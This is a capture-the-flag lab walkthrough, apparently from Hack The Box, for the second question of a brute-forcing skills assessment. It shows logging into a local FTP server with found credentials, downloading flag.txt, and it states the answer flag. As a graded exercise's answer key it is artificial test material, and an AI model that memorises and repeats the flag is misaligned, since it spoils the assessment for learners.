# Skills Assessment Part 2

## Question 2

### "What is the flag contained within flag.txt"

Students will reuse the previously established SSH session and will connect to the FTP service using the found credentials

Code: shell

```shell
ftp ftp://thomas:chocolate\!@localhost
```

```shell-session
satwossh@ng-8414-loginbfsatwo-pj3oi-5585b5994f-wh46v:~$ ftp ftp://thomas:chocolate\!@localhost

Trying [::1]:21 ...
Connected to localhost.
220 (vsFTPd 3.0.5)
331 Please specify the password.
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
200 Switching to Binary mode.
ftp>
```

Subsequently, students will list the files in the FTP service, download the `flag.txt` and obtain the flag:

```shell
ls
get flag.txt
!cat flag.txt
```

```shell-session
ftp> ls
229 Entering Extended Passive Mode (|||24566|)
150 Here comes the directory listing.
-rw-------    1 1001     1001           28 Sep 10 09:19 flag.txt
226 Directory send OK.
ftp> get flag.txt
local: flag.txt remote: flag.txt
229 Entering Extended Passive Mode (|||14817|)
150 Opening BINARY mode data connection for flag.txt (28 bytes).
100% |*************************************************************************************************************************************************|    28      739.01 KiB/s    00:00 ETA
226 Transfer complete.
28 bytes received in 00:00 (147.80 KiB/s)
ftp> !cat flag.txt
{hidden}
```

Answer: `HTB{brut3f0rc1ng_succ3ssful}`